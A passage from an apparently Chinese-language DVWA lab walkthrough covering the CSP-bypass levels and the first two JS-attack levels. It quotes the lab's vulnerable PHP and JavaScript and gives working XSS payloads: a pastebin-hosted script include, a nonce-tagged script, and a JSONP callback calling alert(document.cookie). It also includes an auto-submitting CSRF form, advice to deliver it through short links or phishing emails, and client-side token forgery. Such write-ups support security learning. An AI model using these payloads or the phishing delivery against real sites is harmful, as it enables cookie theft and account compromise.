<p>除了限制可以从中加载内容的域之外，服务器还可以指定允许使用哪些协议; 例如（理想情况下，从安全角度来看），服务器可以指定必须使用HTTPS加载所有内容。完整的数据传输安全策略不仅包括强制HTTPS进行数据传输，还包括使用安全标记标记所有cookie，并提供从HTTP页面到其HTTPS对应项的自动重定向。站点还可以使用Strict-Transport-SecurityHTTP标头来确保浏览器仅通过加密通道连接到它们。</p>
<p>两种方法可以启用 CSP。</p>
<ul>
<li>一种是通过 HTTP 头信息的Content-Security-Policy的字段。</li>
<li>一种是通过网页的<meta>标签</li>
</ul>
<h2 id="Low-13">Low</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="hljs-comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment"># These might work if you can&#x27;t create your own for some reason</span><br><span class="hljs-comment"># https://pastebin.com/raw/R570EE00</span><br><span class="hljs-comment"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &lt;script src=&#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>这里可以看到网站通过添加HTTP头信息的Content-Security-Policy的字段来开启CSP：<a target="_blank" rel="noopener" href="http://xn--pastebin-gq8mn0iju0dl0mivas85ctj0bj15alpd77ea6699apxw59d8q1dtnf.com">要求本页面只能加载来自自身的或者pastebin.com</a>, <a target="_blank" rel="noopener" href="http://hastebin.com">hastebin.com</a>, jquery and google analytics.这些网站的js脚本代码</p>
<p>其中 <a target="_blank" rel="noopener" href="http://pastebin.com">pastebin.com</a> 是一个快速分享文本内容的网站，这个内容我们是可控的，可以在这里面插入 XSS 攻击语句：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">https://pastebin.com/raw/dtZzx4TF<br></code></pre></td></tr></table></figure>
<p>我们在上述网站构造XSS语句，之后记录下生成的网址，接着放入DVWA的文本输入框中，点击include即可触发XSS，但我这里不知为何没有反应</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113153131110.png" alt="image-20240113153131110"></p>
<p>这里还可以配合 CSRF 让攻击更加自动化：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1:8888/vulnerabilities/csp/&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;csp&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;include&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> form = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;csp&quot;</span>);</span><br><span class="language-javascript">  form[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>=<span class="hljs-string">&quot;https://pastebin.com/raw/ZFnbmjBU&quot;</span>;</span><br><span class="language-javascript">  form.<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>将上述内容保存为 csrf.html 然后上传到公网服务器上</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">https://www.yourwebsite.com/csrf.html<br></code></pre></td></tr></table></figure>
<p>将这个地址想方设法让受害者访问的话，就会自动触发 CSRF 和 XSS 攻击。这里可以采用短网址、钓鱼邮件等方法</p>
<h2 id="Medium-13">Medium</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-comment">// Disable XSS protections so that inline alert boxes will work</span><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>
<ol>
<li><strong>script-src ‘self’</strong>: 指定允许执行 JavaScript 代码的来源。在这里，<code>'self'</code> 表示只允许从同一域名加载脚本。</li>
<li><strong>‘unsafe-inline’</strong>: 允许内联脚本的执行，即在 HTML 中直接嵌入的脚本。</li>
<li><strong>‘nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’</strong>: 使用 nonce（一次性随机值）来标识允许执行的脚本。在这里，指定了一个特定的 nonce 值。只有包含这个 nonce 的脚本才会被执行。</li>
</ol>
<p>由于这一关允许内联脚本执行，因此我们直接构造XSS即可，但要注意需要包含上述指定的nonce值</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;<span class="hljs-built_in">alert</span>(&#x27;hacker&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113154138486.png" alt="image-20240113154138486"></p>
<p>之后直接输入文本框提交即可</p>
<h2 id="High-13">High</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>这里做出了严格的限制，只允许加载来自自身网站的js脚本，但好在页面中有如下提示</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">The page makes <span class="hljs-selector-tag">a</span> call to ../..<span class="hljs-comment">//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</span><br></code></pre></td></tr></table></figure>
<p>说这个网站页面会加载<code>vulnerabilities/csp/source/jsonp.php</code>下的php的代码，对应内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">&quot;callback&quot;</span>, <span class="hljs-variable">$_GET</span>)) &#123;<br>	<span class="hljs-variable">$callback</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$outp</span> = <span class="hljs-keyword">array</span> (<span class="hljs-string">&quot;answer&quot;</span> =&gt; <span class="hljs-string">&quot;15&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$callback</span> . <span class="hljs-string">&quot;(&quot;</span>.<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$outp</span>).<span class="hljs-string">&quot;)&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>判断变量callback是否存在与get传参中，如果存在的话，则会与js解码出来的数据一同拼接输出</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113160033855.png" alt="image-20240113160033855"></p>
<p>同时页面代码还存在自动加载high.js文件，我们追踪看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clickButton</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> s = document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);<br>    s.src = <span class="hljs-string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;<br>    document.body.<span class="hljs-title function_ invoke__">appendChild</span>(s);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">solveSum</span>(<span class="hljs-params">obj</span>) </span>&#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;answer&quot;</span> in obj) &#123;<br>		document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;answer&quot;</span>).innerHTML = obj[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>	&#125;<br>&#125;<br><span class="hljs-keyword">var</span> solve_button = document.<span class="hljs-title function_ invoke__">getElementById</span> (<span class="hljs-string">&quot;solve&quot;</span>);<br><br><span class="hljs-keyword">if</span> (solve_button) &#123;<br>	solve_button.<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, function() &#123;<br>		<span class="hljs-title function_ invoke__">clickButton</span>();<br>	&#125;);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里表名，当我们点击id为solve的元素之后，便会调用clickButton函数，solve位置如下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113160344909.png" alt="image-20240113160344909"></p>
<p>该函数会创建一个script标签：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;script <span class="hljs-attribute">src</span>=&quot;http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum<span class="hljs-string">&quot;&gt;&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
<p>这个时候浏览器就会发起如下请求：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum<br></code></pre></td></tr></table></figure>
<p>访问这个 jsonp.php 会得到如下请求：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113161028991.png" alt="image-20240113161028991"></p>
<p>如果我们将callback改为alert之类的，就会触发弹窗，那接下来就是想办法如何修改callback参数了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>幸运的是这里留了一个include参数，并且该参数内容会直接插入body中，我们直接利用即可，但这里并不是直接插入script标签，因为没有unsafe_inline，因此并不会当做脚本执行。构造如下：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">include=&lt;script <span class="hljs-attribute">src</span>=source/jsonp<span class="hljs-selector-class">.php</span>?callback=<span class="hljs-built_in">alert</span>(document.cookie)&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113161238449.png" alt="image-20240113161238449"></p>
<p>这里加载jsonp.php的代码，并修改callback参数即可成功弹窗</p>
<h2 id="Impossible-13">Impossible</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>这里主要是下面文件发生了改动：jsonp_impossible.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);<br><span class="hljs-variable">$outp</span> = <span class="hljs-keyword">array</span> (<span class="hljs-string">&quot;answer&quot;</span> =&gt; <span class="hljs-string">&quot;15&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;solveSum (&quot;</span>.<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$outp</span>).<span class="hljs-string">&quot;)&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里指定了只能输出 solveSum，这里也就写死了，没法绕过</p>
<h1>0x14 JS Attacks</h1>
<h2 id="Low-14">Low</h2>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;?php<br>$page[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= &lt;&lt;&lt;EOF<br>&lt;script&gt;<br>/*<br>MD5 code from here<br>https://github.com/blueimp/JavaScript-MD5<br>*/<br>!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d&#125;<br><br>    function rot13(inp) &#123;<br>        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);<br>    &#125;<br><br>    function generate_token() &#123;<br>        var phrase = document.getElementById(&quot;phrase&quot;).value;<br>        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));<br>    &#125;<br><br>    generate_token();<br>&lt;/script&gt;<br>EOF;<br>?&gt;<br></code></pre></td></tr></table></figure>
<p>可以到上述代码主要是用来生成一个token，大概逻辑看看我们可以知道，上述代码会在前端html找一个id名为phrase的元素，随后拿到其value值，接着按该值生成独属于其的token。元素位置如下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113162311368.png" alt="image-20240113162311368"></p>
<p>而这里倘若我们直接将其修改为success，会发现页面说我们是一个无效的token，这是因为我们采用的是ChangeMe的token，因此我们需要想办法拿到success生成的token，幸运的是这在前端就生成了，我们只需要改一下phrase的值，在前端运行一下即可</p>
<p>这里在开发者工具中找到对应的js代码地址，在生成token函数的地方下一个断点，接着刷新页面运行，之后会在右侧出现phrase，接着修改其值为success，之后继续运行，会发现，token发生了变化。这时我们直接修改为success提交，会发现提交成功</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113163247276.png" alt="image-20240113163247276"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113163341621.png" alt="image-20240113163341621"></p>
<h2 id="Medium-14">Medium</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;&lt;script src=&quot;&#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>我们跟踪medium.js：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_something</span>(<span class="hljs-params">e</span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> t=<span class="hljs-string">&quot;&quot;</span>,n=e.length-<span class="hljs-number">1</span>;n&gt;=<span class="hljs-number">0</span>;n--)t+=e[n];<br>    <span class="hljs-keyword">return</span> t<br>&#125;<br><span class="hljs-title function_ invoke__">setTimeout</span>(function()&#123;<br>    <span class="hljs-title function_ invoke__">do_elsesomething</span>(<span class="hljs-string">&quot;XX&quot;</span>)&#125;,<span class="hljs-number">300</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_elsesomething</span>(<span class="hljs-params">e</span>)</span>&#123; 						document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).value=<span class="hljs-title function_ invoke__">do_something</span>(e+document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).value+<span class="hljs-string">&quot;XX&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里看了一下逻辑，发现其会取token的值为xx+id名为phrase的值+xx，接着传给do_something函数，该函数将传入的参数倒序输出</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113164139019.png" alt="image-20240113164139019"></p>
<p>我们看到上述的token值为XXeMegnahCXX，这意味着我们只需要将其改为XXsseccusXX即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113164255199.png" alt="image-20240113164255199"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113164240377.png" alt="image-20240113164240377"></p>
<p>可以看到成功修改</p>
<h2 id="High-14">High</h2>
